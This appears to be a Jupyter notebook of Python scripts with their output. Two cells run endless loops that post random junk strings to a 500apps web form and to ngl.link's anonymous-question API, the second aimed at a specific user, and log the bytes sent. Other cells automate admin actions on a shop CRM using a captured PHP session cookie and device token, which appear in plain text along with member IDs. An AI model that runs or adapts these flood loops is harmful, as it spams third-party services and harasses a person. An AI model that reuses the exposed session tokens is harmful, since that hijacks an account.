# %%
import string
import random
import requests
n = 0
payloadbytes = 0
cf = 0
float(payloadbytes)
minpayload = 100
maxpayload = 999
url = 'https://api.us1.500apps.com/forms/536481/2638?email='
def id_generator(size=cf, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase + string.punctuation + string.ascii_letters + "@"):
    return ''.join(random.choice(chars) for _ in range(size))
while True:
    cf = random.randint(minpayload,maxpayload)
    cw = random.randint(minpayload,maxpayload)
    ca = random.randint(minpayload,maxpayload)
    cb = random.randint(minpayload,maxpayload)
    cc = random.randint(minpayload,maxpayload)
    cd = random.randint(minpayload,maxpayload)
    us = id_generator(cf)
    up = id_generator(cw)
    ua = id_generator(ca)
    ub = id_generator(cb)
    uc = id_generator(cc)
    ud = id_generator(cd)
    cv = cw+cf+ca+cb+cc+cd
    data = {'f7fd8cab-0288-4f2d-a778-85489dab4138': us, '32328cb1-f965-452f-8b7b-9fe8a8606f97': up, 'a7f239be-0c6d-4d9e-89fa-57ea13eb43f7': ua, 'ce23dbcf-79f6-4d0b-97a9-524d0da79bc1': ub, 'de47dc74-9a47-4f02-b32e-66c2998aee08': uc, '12b67353-d7d0-460f-b841-bd84f955c158': ud, '6b6f9a14-f9bf-493e-a62a-f5561f9dbdf0': ""}
    response = requests.post(url, data=data)
    n+=1
    payloadbytes += cv
    #print(us,up)
    print(f"n = {n} , sent {cf:,} {cw:,} {ca:,} {cb:,} {cc:,} {cd:,} = {cv:,} bytes , total = {payloadbytes:,} bytes")
# Out:
# n = 1 , sent 427 234 441 490 933 996 = 3,521 bytes , total = 3,521 bytes
# n = 2 , sent 289 110 822 295 917 260 = 2,693 bytes , total = 6,214 bytes
# n = 3 , sent 638 727 725 208 369 272 = 2,939 bytes , total = 9,153 bytes
# n = 4 , sent 147 853 627 588 444 972 = 3,631 bytes , total = 12,784 bytes
# n = 5 , sent 707 611 569 480 174 593 = 3,134 bytes , total = 15,918 bytes
# n = 6 , sent 967 303 428 974 924 865 = 4,461 bytes , total = 20,379 bytes
# n = 7 , sent 977 172 183 273 284 436 = 2,325 bytes , total = 22,704 bytes
# n = 8 , sent 291 165 272 343 379 152 = 1,602 bytes , total = 24,306 bytes
# n = 9 , sent 485 503 282 180 434 159 = 2,043 bytes , total = 26,349 bytes
# n = 10 , sent 517 664 530 151 127 162 = 2,151 bytes , total = 28,500 bytes
# n = 11 , sent 351 550 834 733 218 457 = 3,143 bytes , total = 31,643 bytes
# n = 12 , sent 327 642 123 433 738 388 = 2,651 bytes , total = 34,294 bytes
# n = 13 , sent 186 131 763 891 418 783 = 3,172 bytes , total = 37,466 bytes
# ...

# %%
import requests

# Define the URL and the data you want to send in the POST request
url = 'https://shop.ctpcrm.com/managemembernote.php'
data = {
    'membernote_name': 'request007__name__',
    'membernote_detail': '<div>008_cmt</div>',
    'files' : '(binary)',
    'membernote_datefrom_day': "",
    'membernote_datefrom_month': "",
    'membernote_datefrom_year': "",
    'membernote_dateto_day': "",
    'membernote_dateto_month': "",
    'membernote_dateto_year': "",
    'membernote_photo': '(binary)',
    'member_id': '424835',
    'action': 'adminadd',
}

# Send the POST request
response = requests.post(url, data=data)

# Print the status code and response content
print(f"Status Code: {response.status_code}")
print(f"Response Text: {response.text}")
# Out:
# Status Code: 200
# Response Text: <meta http-equiv='refresh' content='0;URL=home.php'>

# %%
import requests

# Define the URL and the cookie (replace with your actual session ID)
url = 'https://shop.ctpcrm.com/managemembernote.php'
cookies = {
    'PHPSESSID':'65rctdogo5akgedlqaqj08f4jr',
    'ctp_lastshop':'9134983', #code shop
    'ctp_member_id_9134983':'424835', #
    'login_type':'line',
    'ctp_lastmember':'424835',
    '_gid':'GA1.2.1057282335.1727167667',
    'device':'%242y%2410%24g3lgOL8GognE0g4fZD9touR6LFTulwcVTnSNLDWlDRg9qjFy4nIPC',
    '_ga_RBLJDJ9TDE':'GS1.1.1727167666.1.1.1727168191.0.0.0',
    '_gat_gtag_UA_153272166_1':'1',
    '_ga_N9681N814Q':'GS1.1.1727167666.1.1.1727169620.56.0.0',
    '_ga':'GA1.1.754961164.1727167667',
}

# The data you want to send in the POST request
data = {
    'membernote_name': 'request009__name__',
    'membernote_detail': '<div>009_cmt</div>',
    'files' : '(binary)',
    'membernote_datefrom_day': "",
    'membernote_datefrom_month': "",
    'membernote_datefrom_year': "",
    'membernote_dateto_day': "",
    'membernote_dateto_month': "",
    'membernote_dateto_year': "",
    'membernote_photo': '(binary)',
    'member_id': '424835',
    'action': 'adminadd',
}

# Send the POST request with the cookie
response = requests.post(url, data=data, cookies=cookies)

# Print the status code and response content
print(f"Status Code: {response.status_code}")
print(f"Response Text: {response.text}")
# Out:
# Status Code: 200
# Response Text: <meta http-equiv='refresh' content='0;URL=membernotedetail.php?note=17725'>

# %%
import requests

#define name id score

name = "ครูที ทดสอบระบบ 27/9/67 18.00-20.00"
cmt = "<div>ชื่อโปรโมชั่น SPK คอร์สปั้นลูก 4 /วันธรรมดา คณิต/</div>"
memid = "178449"
scor = "10" # เพิ่มคะแนนเท่าไร
pakid = "9460"

# Define the URL and the cookie (replace with your actual session ID)
url = 'https://shop.ctpcrm.com/managemembernote.php'
urll = 'https://shop.ctpcrm.com/managepoint.php?action=managepoint'
urlll = "https://shop.ctpcrm.com/managepromotionspecial.php"
cookies = {
    'PHPSESSID':'65rctdogo5akgedlqaqj08f4jr',
    'ctp_lastshop':'9134983', #code shop
    'ctp_member_id_9134983':'424835', #
    'login_type':'line', #typelogin
    'ctp_lastmember':'424835' #
}

# The data you want to send in the POST request
data = {
    'membernote_name': name, #%teacher_name%%subject%%data%%time%
    'membernote_detail': cmt, #comment
    'files' : '(binary)',
    'membernote_datefrom_day': "",
    'membernote_datefrom_month': "",
    'membernote_datefrom_year': "",
    'membernote_dateto_day': "",
    'membernote_dateto_month': "",
    'membernote_dateto_year': "",
    'membernote_photo': '(binary)',
    'member_id': memid, #student_id
    'action': 'adminadd',
}

dataa = {
    'pointtype': 'add',
    'member_point': scor,
    'sel_expire424835': 'none',
    'pointhistory_expiredate': '',
    'pointhistory_note': '',
    'tmp_token': '',
    'member_id': memid,
    'submit': '',
    'id': '',
    'page': ''
}

dataaa = {
    'promotionspecialrecieveservice_note': '',
    'promotionspecialrecieveservice_proof': '(binary)',
    'action': 'usebyadmin',
    'tmp_token': '',
    'id': pakid,
    
}

# Send the POST request with the cookie
response = requests.post(url, data=data, cookies=cookies)
response = requests.post(urll, data=dataa, cookies=cookies)
response = requests.post(urlll, data=dataaa, cookies=cookies)
# Print the status code and response content
print(f"Status Code: {response.status_code}")
print(f"Response Text: {response.text}")
print("complete")
# Out:
# Status Code: 200
# Response Text: <meta http-equiv='refresh' content='0;URL=adminpromotionspecialuse_detail.php?id=9460'>
# complete

# %% [markdown]
# https://shop.ctpcrm.com/managepromotionspecial.php
#
# https://ngl.link/api/submit
#
# kxn_yxnxt
#
# username: apiphon.exe1
# question: rrr
# deviceId: 74727848-7418-40d6-ba57-a112416a43e1
# gameSlug:
# referrer:

# %%
name = "ครูที ทดสอบระบบ 27/9/67 16.00-18.00 60scc"
cmt = "<div>นี่คือการทดสอบระบบ เพิ่มคะแนน 5 คะแนน </div>"
memid = "178449"
scor = 10

username: apiphon.exe1
question: rrr
deviceId: 74727848-7418-40d6-ba57-a112416a43e1
gameSlug: 
referrer:

# %%
import string
import random
import requests
n = 0
payloadbytes = 0
cf = 0
float(payloadbytes)
minpayload = 900
maxpayload = 1000
url = 'https://ngl.link/api/submit'
def id_generator(size=cf, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase + string.punctuation + string.ascii_letters + "@"):
    return ''.join(random.choice(chars) for _ in range(size))
while True:
    cf = random.randint(minpayload,maxpayload)
    us = id_generator(cf)
    cv = cf
    data = {
            'username': 'apiphon.exe1',
            'question': us,
            'deviceId': '74727848-7418-40d6-ba57-a112416a43e1',
            'gameSlug': '',
            'referrer': '',
           }
    response = requests.post(url, data=data)
    n+=1
    payloadbytes += cv
    print(f"n = {n} , sent {cf:,} = {cv:,} bytes , total = {payloadbytes:,} bytes")
# Out:
# n = 1 , sent 953 = 953 bytes , total = 953 bytes
# n = 2 , sent 987 = 987 bytes , total = 1,940 bytes
# n = 3 , sent 988 = 988 bytes , total = 2,928 bytes
# n = 4 , sent 910 = 910 bytes , total = 3,838 bytes
# n = 5 , sent 908 = 908 bytes , total = 4,746 bytes
# ---------------------------------------------------------------------------
# TypeError                                 Traceback (most recent call last)
# ~\anaconda3\lib\site-packages\urllib3\connectionpool.py in _make_request(self, conn, method, url, timeout, chunked, **httplib_request_kw)
#     378                 # Python 2.7, use buffering of HTTP responses
# --> 379                 httplib_response = conn.getresponse(buffering=True)
#     380             except TypeError:
#
# TypeError: getresponse() got an unexpected keyword argument 'buffering'
#
# During handling of the above exception, another exception occurred:
#
# KeyboardInterrupt                         Traceback (most recent call last)
# ...
